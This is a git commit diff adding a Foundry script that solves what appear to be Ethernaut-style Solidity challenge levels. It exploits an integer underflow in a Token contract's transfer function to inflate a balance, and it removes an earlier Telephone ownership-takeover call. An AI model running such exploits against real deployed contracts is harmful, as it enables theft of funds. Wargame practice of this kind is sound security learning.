564ea6b70d56e2ccf4b39582b2a9e43b21a9d967
dCRYPT <39372980+adeolu98@users.noreply.github.com>
2023-06-08 17:49:33 +0100

    add solution

--- script/Attack.s.sol
+++ script/Attack.s.sol
@@ -2,24 +2,25 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Script.sol";
-import "../src/Attacker.sol";
+import "../src/Token.sol";
 import "forge-std/console.sol";
 
 contract AttackScript is Script {
+    function setUp() public {}
 
-Attacker attackerContract;
-    function setUp() public {
-              vm.startBroadcast();
-     attackerContract = new Attacker();
-       vm.stopBroadcast();
-     
-    }
 
+// solved, issue due to overflow in token contract (version 0.6.0) transfer function when subtracting big num from small num
     function run() public {
-
         vm.startBroadcast();
 
-        attackerContract.attack();
+        Token token = Token(0xDEd123dc4795C597c06514F259E438BF91006F32);
+
+        token.transfer(address(0), 10000);
+
+        console.log(
+            "bal of ",
+            token.balanceOf(0x80805ae3cbE23715C1f1807A03C5fb669541C2A9)
+        );  
 
         vm.stopBroadcast();
     }
--- src/Attacker.sol
+++ src/Attacker.sol
@@ -1,18 +1,12 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "./Telephone.sol";
+import "./Token.sol";
 
 
 contract Attacker {
-    uint256 public consecutiveWins;
-    uint256 lastHash;
-    uint256 FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    Telephone telephoneContract = Telephone(0x453003544186687DF714C2e91f10F61aDb559b7d);
-
 
     function attack() public {
-        telephoneContract.changeOwner(0x80805ae3cbE23715C1f1807A03C5fb669541C2A9);       
+            
     }
 }
